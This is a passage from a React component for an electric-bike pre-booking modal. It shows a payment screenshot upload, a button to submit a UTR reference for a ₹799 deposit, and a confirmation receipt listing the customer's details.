                              <span className="text-[11px] text-[#00ff9d]">
                                ✓ Screenshot Attached
                              </span>
                            </div>
                          </div>
                          <button
                            type="button"
                            onClick={handleRemoveScreenshot}
                            className="p-1.5 rounded-lg bg-red-500/20 text-red-400 hover:bg-red-500/30 transition-colors"
                            title="Remove Screenshot"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </div>
                      ) : (
                        <label
                          htmlFor="screenshot-upload"
                          className="w-full p-2.5 rounded-xl border border-dashed border-white/20 hover:border-[#00f0ff]/60 bg-white/5 hover:bg-white/10 text-xs text-gray-300 flex items-center justify-center gap-2 cursor-pointer transition-all"
                        >
                          {isCompressing ? (
                            <>
                              <Loader2 className="w-4 h-4 animate-spin text-[#00f0ff]" />
                              <span>Preparing Attachment...</span>
                            </>
                          ) : (
                            <>
                              <Upload className="w-4 h-4 text-[#00f0ff]" />
                              <span>Upload Payment Screenshot (JPG, PNG)</span>
                            </>
                          )}
                        </label>
                      )}
                    </div>
                  </div>
                </div>

                {/* Submit UTR Action Button */}
                <button
                  type="submit"
                  disabled={isVerifyingPayment || isCompressing}
                  className="w-full py-3.5 rounded-xl bg-gradient-to-r from-[#00f0ff] via-[#00c8ff] to-[#0088ff] text-black font-heading font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-2 shadow-[0_0_30px_rgba(0,240,255,0.5)] hover:shadow-[0_0_45px_rgba(0,240,255,0.8)] disabled:opacity-50 transition-all cursor-pointer"
                >
                  {isVerifyingPayment ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin text-black" />
                      <span>Verifying UTR & Registering...</span>
                    </>
                  ) : (
                    <>
                      <CheckCircle2 className="w-4 h-4 text-black fill-black" />
                      <span>Submit UTR & Confirm Booking (₹799)</span>
                    </>
                  )}
                </button>
              </motion.form>
            )}

            {/* STEP 4: FINAL BOOKING CONFIRMED & RECEIPT */}
            {step === 'success' && (
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                className="space-y-4 text-center"
              >
                {/* Green Check Icon */}
                <div className="w-14 h-14 rounded-full bg-[#00ff9d]/15 border border-[#00ff9d]/40 flex items-center justify-center mx-auto text-[#00ff9d] shadow-[0_0_30px_rgba(0,255,157,0.3)]">
                  <CheckCircle className="w-7 h-7" />
                </div>

                <div>
                  <span className="text-xs font-semibold text-[#00ff9d] uppercase block mb-1">
                    Priority Queue Reservation Confirmed
                  </span>
                  <h4 className="text-xl sm:text-2xl font-heading font-extrabold text-white">
                    Thank You for Pre-Booking!
                  </h4>
                  <p className="text-xs text-gray-400 mt-1">
                    Order Reference Code: <span className="font-mono text-[#00f0ff] font-bold">{bookingRefId}</span>
                  </p>
                </div>

                {/* Printable Order Receipt Box */}
                <div className="p-4 rounded-2xl bg-black/80 border border-[#00ff9d]/30 text-left space-y-2 text-xs">
                  <div className="flex justify-between border-b border-white/10 pb-2">
                    <span className="text-gray-400">Reserved Bike:</span>
                    <span className="text-white font-bold">{bike.name}</span>
                  </div>
                  <div className="flex justify-between border-b border-white/10 pb-2">
                    <span className="text-gray-400">Customer Name:</span>
                    <span className="text-white font-bold">{formData.fullName}</span>
                  </div>
                  <div className="flex justify-between border-b border-white/10 pb-2">
                    <span className="text-gray-400">Contact Phone:</span>
                    <span className="text-white font-bold">{formData.phone}</span>
                  </div>
                  <div className="flex justify-between border-b border-white/10 pb-2">
                    <span className="text-gray-400">UTR / Ref Number:</span>
                    <span className="text-[#00ff9d] font-mono font-bold">{utrNumber || 'SUBMITTED'}</span>
                  </div>
                  {screenshotFileName && (
                    <div className="flex justify-between border-b border-white/10 pb-2">
                      <span className="text-gray-400">Screenshot Sent:</span>
                      <span className="text-[#00f0ff] font-medium">{screenshotFileName}</span>
                    </div>
                  )}
                  <div className="flex justify-between pt-1">
                    <span className="text-gray-400">Deposit Paid:</span>
                    <span className="text-[#00f0ff] font-bold text-sm">₹799.00 (Fully Refundable)</span>
                  </div>
                </div>

                <div className="p-3.5 rounded-xl bg-[#00ff9d]/10 border border-[#00ff9d]/30 text-[#00ff9d] text-xs">
                  ✨ Our mobility executive will contact you shortly on <strong>{formData.phone}</strong> for document verification and queue allotment.
                </div>

                {/* Close Button */}
                <button
                  onClick={handleResetModal}
                  className="w-full py-3 rounded-xl bg-white/10 hover:bg-white/20 text-white font-semibold text-xs uppercase tracking-wider border border-white/20 transition-colors cursor-pointer"
                >
                  Close & Finish
                </button>
              </motion.div>
            )}
          </div>
        </motion.div>
      </div>
    </AnimatePresence>
  );
};
